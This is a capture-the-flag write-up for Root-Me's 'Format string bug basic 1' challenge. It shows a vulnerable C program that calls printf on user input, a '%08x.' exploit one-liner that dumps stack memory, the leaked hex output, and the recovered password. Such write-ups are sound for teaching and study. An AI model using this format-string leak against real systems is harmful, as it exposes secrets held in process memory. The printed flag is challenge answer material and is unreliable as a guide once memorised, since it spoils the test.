# ELF x86 - Format string bug basic 1
- Point: 15pts
- Author: [Lu33Y](https://www.root-me.org/Lu33Y?lang=en),  8 February 2012
- Level: Easy<br><br>
![image](https://user-images.githubusercontent.com/48288606/141501790-9851fa6d-9b74-44b1-9960-74e627795010.png)
## Write-up:

```
#include <stdio.h>
#include <unistd.h>
 
int main(int argc, char *argv[]){
        FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");
        char buffer[32];
        fgets(buffer, sizeof(buffer), secret);
        printf(argv[1]);
        fclose(secret);
        return 0;
}
```
The code open file **.passwd** which includes the password we need, then write it into **buffer** array. <br>
The vulnerability in `printf(argv[1]);`, it execute without **Format specifier".**So we can take advantage of this  to look into the stack to find out the password.
### Solution:
- We'll "brute-force" the buffer space and examine the output value. Print the value with hex code: <br>
`./ch5 $(python -c "print '%08x.'*32")`
- Output:
```
00000020.0804b160.0804853d.00000009.bffffcc5.b7e1b589.bffffb94.b7fc3000.b7fc3000.0804b160.39617044.28293664.6d617045.bf000a64.0804861b.00000002.bffffb94.bffffba0.cfa6f800.bffffb00.00000000.00000000.b7e03f21.b7fc3000.b7fc3000.00000000.b7e03f21.00000002.bffffb94.bffffba0.bffffb24.00000001.
```
- Convert to ASCII text ([HextoText](https://www.rapidtables.com/convert/number/hex-to-ascii.html)):<br><br>
![image](https://user-images.githubusercontent.com/48288606/141614663-d2edc72c-3b5f-4267-9ec4-aefeb2fcfeb7.png)<br><br>
As illustrated, a part of string above contains the real password; therefore, we just write these bytes into "big endian" [See script here](ELF%20x86%20-%20Format%20string%20bug%20basic%201.py) format and convert again to hex.<br>
Pass: Dpa9d6)(Epamd


